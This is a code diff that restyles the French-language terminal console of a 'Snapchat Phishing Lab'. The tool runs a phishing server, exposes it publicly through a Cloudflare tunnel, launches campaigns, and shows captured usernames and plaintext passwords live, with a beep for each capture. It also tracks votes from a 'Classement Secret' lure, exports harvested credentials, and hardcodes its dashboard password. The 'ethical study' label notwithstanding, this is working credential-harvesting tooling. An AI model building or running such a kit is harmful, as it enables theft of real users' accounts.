@@ -17,26 +17,54 @@ ACCESS_PW = os.environ.get("SNAPCHAT_LAB_DASHBOARD_PW", "76247010aidafamoussa")
 
 sys.path.insert(0, BASE)
 
-# ── Colors ──
+# ── Rich imports ──
 try:
-    from colorama import init, Fore, Style
+    from rich.console import Console
+    from rich.panel import Panel
+    from rich.table import Table
+    from rich.layout import Layout
+    from rich.live import Live
+    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
+    from rich.prompt import Prompt, Confirm
+    from rich.text import Text
+    from rich.columns import Columns
+    from rich.align import Align
+    from rich.box import DOUBLE, ROUNDED, HEAVY, MINIMAL, SQUARE
+    from rich.style import Style
+    from rich.spinner import Spinner
+    from rich.syntax import Syntax
+    from rich.markdown import Markdown
+    from rich.traceback import install as install_rich_tb
+    install_rich_tb()
+    RICH_OK = True
+except ImportError:
+    RICH_OK = False
+
+# ── Fallback colors ──
+try:
+    from colorama import init, Fore, Style as CStyle
     init()
-    R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; C = Fore.CYAN;
-    M = Fore.MAGENTA; B = Fore.BLUE; W = Fore.WHITE; X = Style.RESET_ALL; D = Style.DIM
+    R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; C = Fore.CYAN
+    M = Fore.MAGENTA; B = Fore.BLUE; W = Fore.WHITE; X = CStyle.RESET_ALL; D = CStyle.DIM
 except ImportError:
     class _F:
         def __getattr__(self, n): return ''
-    Fore = _F(); Style = _F()
+    Fore = _F()
     R=G=Y=C=M=B=W=X=D=''
 
-# ── Logo ──
-LOGO = f"""\
-{Y}   ███████╗███╗   ███╗     ███████╗███╗   ██╗ ██████╗{X}
-{Y}   ██╔════╝████╗ ████║     ██╔════╝████╗  ██║██╔════╝{X}
-{Y}   █████╗  ██╔████╔██║     ███████╗██╔██╗ ██║██║  ███╗{X}
-{Y}   ██╔══╝  ██║╚██╔╝██║     ╚════██║██║╚██╗██║██║   ██║{X}
-{Y}   ██║     ██║ ╚═╝ ██║     ███████║██║ ╚████║╚██████╔╝{X}
-{Y}   ╚═╝     ╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝{X}"""
+# ── Console ──
+console = Console() if RICH_OK else None
+
+# ── Logo ASCII ──
+LOGO_RAW = """\
+███████╗███╗   ███╗     ███████╗███╗   ██╗ ██████╗
+██╔════╝████╗ ████║     ██╔════╝████╗  ██║██╔════╝
+███████╗██╔████╔██║     ███████╗██╔██╗ ██║██║  ███╗
+╚════██║██║╚██╔╝██║     ╚════██║██║╚██╗██║██║   ██║
+███████║██║ ╚═╝ ██║     ███████║██║ ╚████║╚██████╔╝
+╚══════╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝"""
+
+TAGLINE = "Purple Team  •  Research Tool  •  Ethical Phishing Study"
 
 # ── Globals ──
 flask_thread = None
@@ -44,6 +72,84 @@ cf_thread = None
 cf_url = None
 cf_proc = None
 WATCH_ACTIVE = False
+CONFIG_CACHE = {}
+
+# ══════════════════════════════════════════════════════════════
+#  RICH SHORTHANDS
+# ══════════════════════════════════════════════════════════════
+
+def panic(text):
+    if RICH_OK:
+        console.print(Panel(f"[bold red]{text}[/]", border_style="red"))
+    else:
+        print(f"  {R}{text}{X}")
+
+def okay(text):
+    if RICH_OK:
+        console.print(Panel(f"[bold green]{text}[/]", border_style="green"))
+    else:
+        print(f"  {G}✓ {text}{X}")
+
+def info(text):
+    if RICH_OK:
+        console.print(f"[cyan]●[/] {text}")
+    else:
+        print(f"  {C}● {text}{X}")
+
+def warn(text):
+    if RICH_OK:
+        console.print(f"[yellow]⚠[/] {text}")
+    else:
+        print(f"  {Y}⚠ {text}{X}")
+
+def dim(text):
+    if RICH_OK:
+        console.print(f"[dim]{text}[/]")
+    else:
+        print(f"  {D}{text}{X}")
+
+def divider():
+    if RICH_OK:
+        console.rule(style="dim")
+    else:
+        print(f"  {D}{'─' * 60}{X}")
+
+def pause():
+    if RICH_OK:
+        Prompt.ask("[dim]Appuie sur [bold]Entrée[/] pour continuer[/]")
+    else:
+        input(f"\n  {D}[Appuie sur Entrée]{X}")
+
+def confirm_action(msg="Confirmer ?"):
+    if RICH_OK:
+        return Confirm.ask(f"[yellow]{msg}[/]")
+    else:
+        r = input(f"  {Y}{msg} (o/N) >{X} ").strip().lower()
+        return r in ('o', 'oui', 'y', 'yes')
+
+# ══════════════════════════════════════════════════════════════
+#  LOGO
+# ══════════════════════════════════════════════════════════════
+
+def show_logo():
+    if RICH_OK:
+        console.clear()
+        logo_text = Text()
+        colors = ["yellow", "bright_yellow", "green", "cyan", "blue", "magenta"]
+        for i, line in enumerate(LOGO_RAW.split('\n')):
+            logo_text.append(line + "\n", style=colors[i % len(colors)])
+        console.print(Align.center(Panel(logo_text, border_style="cyan", box=HEAVY)))
+        console.print(Align.center(f"[dim]{TAGLINE}[/]"))
+        console.print()
+    else:
+        cls()
+        print()
+        print(f"{Y}{LOGO_RAW}{X}")
+        print()
+        print(f"  {D}{'─' * 60}{X}")
+        print(f"  {C}  Snapchat Phishing Lab{X}  -  {M}Purple Team Research{X}")
+        print(f"  {D}{'─' * 60}{X}")
+        print()
 
 # ══════════════════════════════════════════════════════════════
 #  DB HELPERS
@@ -74,64 +180,47 @@ def admin_key():
     return None
 
 # ══════════════════════════════════════════════════════════════
-#  UI
+#  TITLE BAR
 # ══════════════════════════════════════════════════════════════
 
 def cls():
     os.system("cls" if os.name == "nt" else "clear")
 
-def title_bar():
-    """Top status bar showing key info."""
+def build_status_bar():
     k = admin_key()
     caps, wpw, sess, voters = db_stats()
     running = is_server_running()
-    tunnel = cf_url or "—"
+    tunnel = cf_url or None
 
-    status = f"{G}● UP{X}" if running else f"{R}● DOWN{X}"
-    caps_str = f"{W}{caps}{X}" if caps > 0 else f"{D}0{X}"
-    pw_str = f"{G}{wpw}{X}" if wpw > 0 else f"{D}0{X}"
+    if not RICH_OK:
+        status = f"{G}● UP{X}" if running else f"{R}● DOWN{X}"
+        caps_str = f"{W}{caps}{X}" if caps > 0 else f"{D}0{X}"
+        pw_str = f"{G}{wpw}{X}" if wpw > 0 else f"{D}0{X}"
+        bar = f"  {C}SERVER{X} {status}  "
+        if running:
+            bar += f"| {C}Captures{X} {caps_str}  | {G}PW{X} {pw_str}  | {C}Sessions{X} {sess}  | {M}Votants{X} {voters}"
+        if tunnel:
+            bar += f"  |  {Y}Tunnel{X} {tunnel[:45]}"
+        print(f"  {D}{'─' * 78}{X}")
+        print(bar)
+        print(f"  {D}{'─' * 78}{X}")
+        return
 
-    bar = f"  {C}SERVER{X} {status}  "
+    parts = []
+    status_str = "[bold green]● UP[/]" if running else "[bold red]● DOWN[/]"
+    srv = f"[cyan]SERVER[/] {status_str}"
     if running:
-        bar += f"| {C}Captures{X} {caps_str}  | {G}PW{X} {pw_str}  | {C}Sessions{X} {sess}  | {M}Votants{X} {voters}"
-    if tunnel and tunnel != "—":
-        bar += f"  |  {Y}Tunnel{X} {tunnel[:45]}"
-    print(f"  {D}{'─' * 78}{X}")
-    print(bar)
-    print(f"  {D}{'─' * 78}{X}")
+        stats = f"[cyan]Captures[/] [white]{caps}[/]  [green]PW[/] [white]{wpw}[/]  [cyan]Sessions[/] [white]{sess}[/]  [magenta]Votants[/] [white]{voters}[/]"
+        parts = [srv, stats]
+    else:
+        parts = [srv]
+    if tunnel:
+        parts.append(f"[yellow]Tunnel[/] [dim]{tunnel[:45]}[/]")
 
-def show_logo():
-    cls()
-    print()
-    print(LOGO)
-    print()
-    print(f"  {D}{'─' * 60}{X}")
-    print(f"  {C}  Snapchat Phishing Lab{X}  -  {M}Purple Team Research{X}")
-    print(f"  {D}{'─' * 60}{X}")
-    print()
-
-def show_menu():
-    print(f"  {C}╔══════════════════════════════════════════════╗{X}")
-    print(f"  {C}║              MENU PRINCIPAL                 ║{X}")
-    print(f"  {C}╚══════════════════════════════════════════════╝{X}")
-    print()
-    print(f"    {M}[1]{X}  Démarrer le serveur")
-    print(f"    {M}[2]{X}  Démarrer avec tunnel Cloudflare")
-    print()
-    print(f"    {C}[3]{X}  Dashboard interactif")
-    print(f"    {C}[4]{X}  Surveillance en direct (Watch Live)")
-    print()
-    print(f"    {M}[5]{X}  🎯 Lancer une campagne")
-    print()
-    print(f"    {Y}[6]{X}  Exporter les données")
-    print(f"    {Y}[7]{X}  Ouvrir dans le navigateur")
-    print(f"    {Y}[8]{X}  Vérifier la base de données")
-    print()
-    print(f"    {R}[9]{X}  Réinitialiser toutes les données")
-    print()
-    print(f"    {D}[0]{X}  Quitter")
-    print()
-    return input(f"  {G}└─>{X} ").strip()
+    divider_text = "  │  ".join(parts)
+    console.rule(style="dim")
+    console.print(f"  {divider_text}")
+    console.rule(style="dim")
 
 # ══════════════════════════════════════════════════════════════
 #  SERVER
@@ -176,10 +265,11 @@ def start_server():
         return True
     flask_thread = threading.Thread(target=start_flask, daemon=True)
     flask_thread.start()
-    for _ in range(20):
-        if is_server_running():
-            return True
-        time.sleep(0.3)
+    with _spinner("Démarrage du serveur...") as _:
+        for _ in range(20):
+            if is_server_running():
+                return True
+            time.sleep(0.3)
     return False
 
 def stop_server():
@@ -190,20 +280,55 @@ def stop_server():
         pass
 
 # ══════════════════════════════════════════════════════════════
+#  SPINNER CONTEXT
+# ══════════════════════════════════════════════════════════════
+
+def _spinner(text):
+    if RICH_OK:
+        return console.status(f"[cyan]{text}[/]", spinner="dots")
+    else:
+        class FakeSpinner:
+            def __enter__(self): print(f"  {C}{text}{X}", end='', flush=True); return self
+            def __exit__(self, *a): print()
+        return FakeSpinner()
+
+def _progress(description, steps=1):
+    if RICH_OK:
+        progress = Progress(
+            SpinnerColumn(),
+            TextColumn("[progress.description]{task.description}"),
+            BarColumn(),
+            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
+            TimeElapsedColumn(),
+        )
+        task = progress.add_task(description, total=steps)
+        return progress, task
+    else:
+        return None, None
+
+def _advance(progress, task, amount=1):
+    if progress:
+        progress.update(task, advance=amount)
+
+def _complete(progress, task):
+    if progress:
+        progress.update(task, completed=100)
+
+# ══════════════════════════════════════════════════════════════
 #  CLOUDFLARE TUNNEL
 # ══════════════════════════════════════════════════════════════
 
 def download_cloudflared():
     if os.path.exists(CF_PATH):
         return True
-    print(f"  {Y}Téléchargement de cloudflared...{X}")
+    info("Téléchargement de cloudflared...")
     url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
     try:
         urllib.request.urlretrieve(url, CF_PATH)
-        print(f"  {G}✓ Téléchargé{X}")
+        okay("Cloudflared téléchargé")
         return True
     except Exception as e:
-        print(f"  {R}✗ Échec : {e}{X}")
+        panic(f"Échec téléchargement cloudflared : {e}")
         return False
 
 def start_tunnel():
@@ -214,10 +339,11 @@ def start_tunnel():
             return None
     cf_thread = threading.Thread(target=_run_tunnel, daemon=True)
     cf_thread.start()
-    for _ in range(45):
-        if cf_url:
-            return cf_url
-        time.sleep(0.4)
+    with _spinner("Connexion au tunnel Cloudflare...") as _:
+        for _ in range(45):
+            if cf_url:
+                return cf_url
+            time.sleep(0.4)
     return None
 
 def _run_tunnel():
@@ -255,141 +381,222 @@ def stop_tunnel():
     cf_url = None
 
 # ══════════════════════════════════════════════════════════════
+#  MENU — MAIN
+# ══════════════════════════════════════════════════════════════
+
+def show_menu_rich():
+    console.print()
+    grid = Table.grid(padding=(0, 2))
+    grid.add_column(justify="left", style="cyan")
+    grid.add_column()
+
+    grid.add_row("", "[bold white]MENU PRINCIPAL[/]")
+    grid.add_row("", "")
+    grid.add_row("[bold magenta][1][/]", "Démarrer le serveur")
+    grid.add_row("[bold magenta][2][/]", "Démarrer + tunnel Cloudflare")
+    grid.add_row("", "")
+    grid.add_row("[bold cyan][3][/]", "Dashboard interactif")
+    grid.add_row("[bold cyan][4][/]", "Watch Live (flux temps réel)")
+    grid.add_row("", "")
+    grid.add_row("[bold magenta][5][/]", "🎯 Lancer une campagne")
+    grid.add_row("", "")
+    grid.add_row("[bold yellow][6][/]", "Exporter les données")
+    grid.add_row("[bold yellow][7][/]", "Ouvrir dans le navigateur")
+    grid.add_row("[bold yellow][8][/]", "Vérifier la base de données")
+    grid.add_row("", "")
+    grid.add_row("[bold red][9][/]", "Réinitialiser toutes les données")
+    grid.add_row("", "")
+    grid.add_row("[bold dim][0][/]", "[dim]Quitter[/]")
+
+    console.print(Panel(grid, border_style="cyan", box=ROUNDED))
+    c = Prompt.ask("[bold green]└─>[/]", default="")
+    return c.strip()
+
+def show_menu_fallback():
+    print(f"  {C}╔══════════════════════════════════════════════╗{X}")
+    print(f"  {C}║              MENU PRINCIPAL                 ║{X}")
+    print(f"  {C}╚══════════════════════════════════════════════╝{X}")
+    print()
+    print(f"    {M}[1]{X}  Démarrer le serveur")
+    print(f"    {M}[2]{X}  Démarrer avec tunnel Cloudflare")
+    print()
+    print(f"    {C}[3]{X}  Dashboard interactif")
+    print(f"    {C}[4]{X}  Surveillance en direct (Watch Live)")
+    print()
+    print(f"    {M}[5]{X}  🎯 Lancer une campagne")
+    print()
+    print(f"    {Y}[6]{X}  Exporter les données")
+    print(f"    {Y}[7]{X}  Ouvrir dans le navigateur")
+    print(f"    {Y}[8]{X}  Vérifier la base de données")
+    print()
+    print(f"    {R}[9]{X}  Réinitialiser toutes les données")
+    print()
+    print(f"    {D}[0]{X}  Quitter")
+    print()
+    return input(f"  {G}└─>{X} ").strip()
+
+# ══════════════════════════════════════════════════════════════
 #  ACTIONS
 # ══════════════════════════════════════════════════════════════
 
 def action_1_start():
     stop_tunnel()
     show_logo()
-    print(f"  {C}Démarrage du serveur...{X}")
+    info("Démarrage du serveur...")
     if start_server():
-        print(f"\n  {G}✓ Serveur actif : {server_url()}{X}")
+        okay(f"Serveur actif : [link={server_url()}]{server_url()}[/]")
     else:
-        print(f"\n  {R}✗ Échec du démarrage{X}")
-    input(f"\n  {D}[Appuie sur Entrée]{X}")
+        panic("Échec du démarrage du serveur")
+    pause()
 
 def action_2_tunnel():
     show_logo()
     if not os.path.exists(CF_PATH):
-        print(f"  {Y}Cloudflared non trouvé. Téléchargement...{X}")
+        warn("Cloudflared non trouvé. Téléchargement...")
         if not download_cloudflared():
-            input(f"\n  {D}[Appuie sur Entrée]{X}")
+            pause()
             return
     stop_tunnel()
     if not start_server():
-        print(f"  {R}✗ Le serveur n'a pas démarré{X}")
-        input(f"  {D}[Appuie sur Entrée]{X}")
+        panic("Le serveur n'a pas démarré")
+        pause()
         return
-    print(f"  {Y}Démarrage du tunnel Cloudflare...{X}")
+    info("Démarrage du tunnel Cloudflare...")
     url = start_tunnel()
     if url:
-        print(f"\n  {G}✓ Tunnel actif : {url}{X}")
+        okay(f"Tunnel actif : [link={url}]{url}[/]")
     else:
-        print(f"\n  {R}✗ Le tunnel n'a pas pu être créé{X}")
-    input(f"\n  {D}[Appuie sur Entrée]{X}")
+        panic("Le tunnel n'a pas pu être créé")
+    pause()
 
 def action_3_dashboard():
     show_logo()
     if not is_server_running():
-        print(f"  {R}✗ Le serveur n'est pas en cours d'exécution{X}")
-        print(f"  {Y}  → Utilise [1] ou [2] pour démarrer{X}")
-        input(f"\n  {D}[Appuie sur Entrée]{X}")
+        warn("Le serveur n'est pas en cours d'exécution")
+        info("Utilise [1] ou [2] pour démarrer")
+        pause()
         return
-    p = input(f"  {Y}Mot de passe dashboard >{X} ")
+    p = Prompt.ask("[yellow]Mot de passe dashboard[/]", password=True) if RICH_OK else input(f"  {Y}Mot de passe dashboard >{X} ")
     if p != ACCESS_PW:
-        print(f"  {R}Accès refusé{X}")
+        panic("Accès refusé")
         time.sleep(1)
-        input(f"\n  {D}[Appuie sur Entrée]{X}")
+        pause()
         return
     terminal_dashboard()
 
 def action_4_watch():
     show_logo()
     if not is_server_running():
-        print(f"  {R}✗ Le serveur n'est pas en cours d'exécution{X}")
-        print(f"  {Y}  → Utilise [1] ou [2] pour démarrer{X}")
-        input(f"\n  {D}[Appuie sur Entrée]{X}")
+        warn("Le serveur n'est pas en cours d'exécution")
+        info("Utilise [1] ou [2] pour démarrer")
+        pause()
         return
     watch_live()
 
 def action_5_export():
     show_logo()
     if not is_server_running():
-        print(f"  {R}✗ Le serveur n'est pas en cours d'exécution{X}")
-        input(f"\n  {D}[Appuie sur Entrée]{X}")
+        warn("Le serveur n'est pas en cours d'exécution")
+        pause()
         return
     export_menu()
 
 def action_6_browser():
     show_logo()
     if not is_server_running():
-        print(f"  {R}✗ Le serveur n'est pas en cours d'exécution{X}")
-        input(f"\n  {D}[Appuie sur Entrée]{X}")
+        warn("Le serveur n'est pas en cours d'exécution")
+        pause()
         return
     target = cf_url if cf_url else server_url()
     webbrowser.open(target)
-    print(f"\n  {G}✓ Ouverture : {target}{X}")
-    input(f"\n  {D}[Appuie sur Entrée]{X}")
+    okay(f"Ouverture : {target}")
+    pause()
 
 def action_7_dbcheck():
     show_logo()
     if not is_server_running():
-        print(f"  {R}✗ Le serveur n'est pas en cours d'exécution{X}")
-        input(f"\n  {D}[Appuie sur Entrée]{X}")
+        warn("Le serveur n'est pas en cours d'exécution")
+        pause()
         return
     ctx = ssl._create_unverified_context()
     try:
         r = urllib.request.urlopen(f"{server_url()}/api/dbcheck", context=ctx, timeout=5)
         d = json.loads(r.read())
-        print(f"  {C}Base de données :{X}")
-        print(f"    {C}Chemin :{X}       {d.get('db_path','?')}")
-        print(f"    {C}Existante :{X}     {'Oui' if d.get('db_exists') else 'Non'}")
-        print(f"    {G}Captures :{X}      {d.get('total_captures',0)}")
-        print(f"    {C}Logs :{X}          {d.get('total_logs',0)}")
         caps, wpw, sessions, voters = db_stats()
-        print(f"    {G}Avec mot de passe :{X} {wpw}")
-        print(f"    {C}Sessions :{X}       {sessions}")
-        print(f"    {M}Votants validés :{X} {voters}")
         bp = os.path.join(BASE, "backups")
-        if os.path.exists(bp):
-            bks = [f for f in os.listdir(bp) if f.endswith('.db')]
-            print(f"    {D}Sauvegardes :{X}    {len(bks)} fichier(s)")
+        bk_count = len([f for f in os.listdir(bp) if f.endswith('.db')]) if os.path.exists(bp) else 0
+
+        if RICH_OK:
+            tbl = Table(box=MINIMAL, border_style="cyan")
+            tbl.add_column("Métrique", style="cyan")
+            tbl.add_column("Valeur")
+            tbl.add_row("Chemin DB", d.get('db_path','?'))
+            tbl.add_row("Existante", "Oui" if d.get('db_exists') else "Non")
+            tbl.add_row("Captures", f"[green]{d.get('total_captures',0)}[/]")
+            tbl.add_row("Avec mot de passe", f"[green]{wpw}[/]")
+            tbl.add_row("Logs", str(d.get('total_logs',0)))
+            tbl.add_row("Sessions", str(sessions))
+            tbl.add_row("Votants validés", f"[magenta]{voters}[/]")
+            tbl.add_row("Sauvegardes", f"[dim]{bk_count} fichier(s)[/]")
+            console.print(Panel(tbl, title="[cyan]Base de données[/]", border_style="cyan"))
+        else:
+            print(f"  {C}Base de données :{X}")
+            print(f"    {C}Chemin :{X}       {d.get('db_path','?')}")
+            print(f"    {C}Existante :{X}     {'Oui' if d.get('db_exists') else 'Non'}")
+            print(f"    {G}Captures :{X}      {d.get('total_captures',0)}")
+            print(f"    {G}Avec mot de passe :{X} {wpw}")
+            print(f"    {C}Logs :{X}          {d.get('total_logs',0)}")
+            print(f"    {C}Sessions :{X}       {sessions}")
+            print(f"    {M}Votants :{X}        {voters}")
+            print(f"    {D}Sauvegardes :{X}    {bk_count} fichier(s)")
     except Exception as e:
-        print(f"  {R}✗ Erreur : {e}{X}")
-    print()
-    input(f"  {D}[Appuie sur Entrée]{X}")
+        panic(f"Erreur : {e}")
+    pause()
 
 def action_8_reset():
     show_logo()
-    print(f"  {R}⚠️  SUPPRESSION TOTALE DES DONNÉES ⚠️{X}")
-    print(f"  {Y}  Cette action supprime toutes les captures et tous les logs.{X}")
-    print()
-    confirm = input(f"  {R}  Taper 'SUPPRIMER' pour confirmer >{X} ").strip().upper()
-    if confirm != "SUPPRIMER":
-        print(f"  {Y}✗ Annulé{X}")
-        input(f"\n  {D}[Appuie sur Entrée]{X}")
+    if RICH_OK:
+        console.print(Panel(
+            "[bold red]⚠  SUPPRESSION TOTALE DES DONNÉES  ⚠[/]\n\n"
+            "[yellow]Cette action supprime toutes les captures, logs et votes.[/]\n"
+            "[dim]Une sauvegarde sera créée automatiquement avant la suppression.[/]",
+            border_style="red", box=HEAVY
+        ))
+    else:
+        print(f"  {R}⚠  SUPPRESSION TOTALE DES DONNÉES  ⚠{X}")
+        print(f"  {Y}Cette action supprime toutes les captures, logs et votes.{X}")
+
+    if not confirm_action("Taper 'SUPPRIMER' pour confirmer"):
+        warn("Annulé")
+        pause()
         return
-    # Backup
-    try:
-        backup_dir = os.path.join(BASE, "backups")
-        os.makedirs(backup_dir, exist_ok=True)
-        if os.path.exists(DB_PATH):
-            bname = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db"
-            shutil.copy2(DB_PATH, os.path.join(backup_dir, bname))
-            print(f"  {D}  ✓ Sauvegarde : {bname}{X}")
-    except Exception as e:
-        print(f"  {R}  ✗ Sauvegarde échouée : {e}{X}")
-    # Reset
-    conn = db()
-    conn.execute("DELETE FROM captured_credentials")
-    conn.execute("DELETE FROM experiment_log")
-    conn.execute("DELETE FROM votes_top3")
-    conn.commit()
-    conn.close()
-    print(f"  {G}  ✓ Toutes les données ont été supprimées{X}")
-    print(f"  {D}  Les votes du Classement Secret ont aussi été réinitialisés{X}")
-    print()
-    input(f"  {D}[Appuie sur Entrée]{X}")
+
+    if not (RICH_OK and Confirm.ask("[red]Vraiment ? Cette action est irréversible ![/]")):
+        if not RICH_OK:
+            c = input(f"  {R}Vraiment irréversible. Continuer ? (o/N) >{X} ").strip().lower()
+            if c not in ('o', 'oui'):
+                warn("Annulé")
+                pause()
+                return
+
+    with _spinner("Sauvegarde et suppression..."):
+        try:
+            backup_dir = os.path.join(BASE, "backups")
+            os.makedirs(backup_dir, exist_ok=True)
+            if os.path.exists(DB_PATH):
+                bname = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db"
+                shutil.copy2(DB_PATH, os.path.join(backup_dir, bname))
+        except Exception as e:
+            warn(f"Sauvegarde échouée : {e}")
+        conn = db()
+        conn.execute("DELETE FROM captured_credentials")
+        conn.execute("DELETE FROM experiment_log")
+        conn.execute("DELETE FROM votes_top3")
+        conn.commit()
+        conn.close()
+    okay("Toutes les données ont été supprimées")
+    dim("Les votes du Classement Secret ont aussi été réinitialisés")
+    pause()
 
 # ══════════════════════════════════════════════════════════════
 #  WATCH LIVE
@@ -407,50 +614,71 @@ def watch_live():
         pass
 
     show_logo()
-    print(f"  {G}[WATCH LIVE]{X} Surveillance en temps réel")
-    print(f"  {D}  Nouveaux credentials capturés et votes s'affichent ici.{X}")
-    print(f"  {D}  Commence au #ID {last_id}. Ctrl+C pour arrêter.{X}")
+    if RICH_OK:
+        console.print(Panel(
+            "[bold green]WATCH LIVE — Surveillance en temps réel[/]\n"
+            "[dim]Nouveaux credentials et votes s'affichent ici. Ctrl+C pour arrêter.[/]",
+            border_style="green", box=ROUNDED
+        ))
+    else:
+        print(f"  {G}[WATCH LIVE]{X} Surveillance en temps réel")
+        print(f"  {D}Nouveaux credentials et votes s'affichent ici. Ctrl+C pour arrêter.{X}")
     print()
-    WATCH_ACTIVE = True
 
+    WATCH_ACTIVE = True
     try:
         while WATCH_ACTIVE:
             time.sleep(1.5)
             conn = db()
-            # Credentials
             rows = conn.execute(
                 "SELECT id, step, username, password, timestamp FROM captured_credentials WHERE id > ? ORDER BY id",
                 (last_id,)
             ).fetchall()
-            # New votes
             votes = conn.execute(
                 "SELECT id, pseudo, snap_validated, created_at FROM votes_top3 WHERE id > ? ORDER BY id",
                 (last_vote_id,)
             ).fetchall()
             conn.close()
 
-            for r in rows:
-                user = r[2] or "-"
-                pw = r[3] if r[3] else "-"
-                step = r[1] or "?"
-                ts = r[4][11:19] if r[4] else "--:--:--"
-                label = f"{G}CAPTURE{X}" if pw and pw != "-" else f"{Y}LOGIN{X}"
-                print(f"  {D}{ts}{X} {label} #{r[0]} [{step:<8}] {user} / {pw}")
-                if pw and pw != "-":
-                    print("  \a", end='', flush=True)
-                last_id = r[0]
-
-            for v in votes:
-                ts = v[3][11:19] if v[3] else "--:--:--"
-                val = f"{G}VALIDÉ{X}" if v[2] else f"{Y}EN ATTENTE{X}"
-                print(f"  {D}{ts}{X} {M}VOTE{X}   #{v[0]} {v[1]} → {val}")
-                last_vote_id = v[0]
-
+            if RICH_OK:
+                for r in rows:
+                    user = r[2] or "-"
+                    pw = r[3] if r[3] else "-"
+                    step = r[1] or "?"
+                    ts = r[4][11:19] if r[4] else "--:--:--"
+                    has_pw = bool(pw and pw != "-")
+                    label = "[bold green]CAPTURE[/]" if has_pw else "[yellow]LOGIN[/]"
+                    style = "green" if has_pw else "yellow"
+                    console.print(f"  [dim]{ts}[/] {label} [bold #{r[0]}][/{bold}] [{step}] [white]{user}[/] / [bold {style}]{pw}[/]")
+                    if has_pw:
+                        console.print("  \a", end='')
+                    last_id = r[0]
+                for v in votes:
+                    ts = v[3][11:19] if v[3] else "--:--:--"
+                    val = "[green]VALIDÉ[/]" if v[2] else "[yellow]EN ATTENTE[/]"
+                    console.print(f"  [dim]{ts}[/] [magenta]VOTE[/]   #{v[0]} [cyan]{v[1]}[/] → {val}")
+                    last_vote_id = v[0]
+            else:
+                for r in rows:
+                    user = r[2] or "-"
+                    pw = r[3] if r[3] else "-"
+                    step = r[1] or "?"
+                    ts = r[4][11:19] if r[4] else "--:--:--"
+                    label = f"{G}CAPTURE{X}" if pw and pw != "-" else f"{Y}LOGIN{X}"
+                    print(f"  {D}{ts}{X} {label} #{r[0]} [{step:<8}] {user} / {pw}")
+                    if pw and pw != "-":
+                        print("  \a", end='', flush=True)
+                    last_id = r[0]
+                for v in votes:
+                    ts = v[3][11:19] if v[3] else "--:--:--"
+                    val = f"{G}VALIDÉ{X}" if v[2] else f"{Y}EN ATTENTE{X}"
+                    print(f"  {D}{ts}{X} {M}VOTE{X}   #{v[0]} {v[1]} → {val}")
+                    last_vote_id = v[0]
     except KeyboardInterrupt:
         pass
     WATCH_ACTIVE = False
-    print(f"\n  {Y}Surveillance arrêtée.{X}")
-    input(f"\n  {D}[Appuie sur Entrée]{X}")
+    info("Surveillance arrêtée.")
+    pause()
 
 # ══════════════════════════════════════════════════════════════
 #  EXPORT
@@ -458,57 +686,74 @@ def watch_live():
 
 def export_menu():
     show_logo()
-    print(f"  {C}Exporter les données{X}")
-    print()
-    print(f"    {W}[1]{X} JSON")
-    print(f"    {W}[2]{X} CSV")
-    print(f"    {W}[3]{X} Rapport HTML")
-    print(f"    {D}[0]{X} Retour")
-    print()
-    c = input(f"  {G}└─>{X} ").strip()
+    if RICH_OK:
+        grid = Table.grid(padding=(0, 2))
+        grid.add_column(justify="left", style="cyan")
+        grid.add_column()
+        grid.add_row("", "[bold white]EXPORTER LES DONNÉES[/]")
+        grid.add_row("", "")
+        grid.add_row("[white][1][/]", "JSON")
+        grid.add_row("[white][2][/]", "CSV")
+        grid.add_row("[white][3][/]", "Rapport HTML")
+        grid.add_row("", "")
+        grid.add_row("[dim][0][/]", "[dim]Retour[/]")
+        console.print(Panel(grid, border_style="yellow", box=ROUNDED))
+        c = Prompt.ask("[bold green]└─>[/]", default="").strip()
+    else:
+        print(f"  {C}Exporter les données{X}")
+        print()
+        print(f"    {W}[1]{X} JSON")
+        print(f"    {W}[2]{X} CSV")
+        print(f"    {W}[3]{X} Rapport HTML")
+        print(f"    {D}[0]{X} Retour")
+        print()
+        c = input(f"  {G}└─>{X} ").strip()
+
     k = admin_key()
     if not k:
-        print(f"  {R}✗ Clé admin introuvable{X}")
-        input(f"\n  {D}[Appuie sur Entrée]{X}")
+        panic("Clé admin introuvable")
+        pause()
         return
     ctx = ssl._create_unverified_context()
     base_url = server_url()
     now = datetime.now().strftime('%Y%m%d_%H%M%S')
 
     if c == "1":
-        try:
-            r = urllib.request.urlopen(f"{base_url}/export?key={k}", context=ctx, timeout=10)
-            data = r.read().decode()
-            path = os.path.join(BASE, f"export_{now}.json")
-            with open(path, "w", encoding="utf-8") as f:
-                f.write(data)
-            print(f"\n  {G}✓ Exporté : {path}{X} ({len(data)} octets)")
-        except Exception as e:
-            print(f"\n  {R}✗ Erreur : {e}{X}")
+        with _spinner("Export JSON..."):
+            try:
+                r = urllib.request.urlopen(f"{base_url}/export?key={k}", context=ctx, timeout=10)
+                data = r.read().decode()
+                path = os.path.join(BASE, f"export_{now}.json")
+                with open(path, "w", encoding="utf-8") as f:
+                    f.write(data)
+                okay(f"Exporté : {path} ({len(data)} octets)")
+            except Exception as e:
+                panic(f"Erreur : {e}")
     elif c == "2":
-        try:
-            r = urllib.request.urlopen(f"{base_url}/export/csv?key={k}", context=ctx, timeout=10)
-            data = r.read().decode('utf-8-sig')
-            path = os.path.join(BASE, f"export_{now}.csv")
-            with open(path, "w", encoding="utf-8-sig") as f:
-                f.write(data)
-            print(f"\n  {G}✓ Exporté : {path}{X} ({len(data)} octets)")
-        except Exception as e:
-            print(f"\n  {R}✗ Erreur : {e}{X}")
+        with _spinner("Export CSV..."):
+            try:
+                r = urllib.request.urlopen(f"{base_url}/export/csv?key={k}", context=ctx, timeout=10)
+                data = r.read().decode('utf-8-sig')
+                path = os.path.join(BASE, f"export_{now}.csv")
+                with open(path, "w", encoding="utf-8-sig") as f:
+                    f.write(data)
+                okay(f"Exporté : {path} ({len(data)} octets)")
+            except Exception as e:
+                panic(f"Erreur : {e}")
     elif c == "3":
-        try:
-            r = urllib.request.urlopen(f"{base_url}/export/report?key={k}", context=ctx, timeout=10)
-            data = r.read().decode()
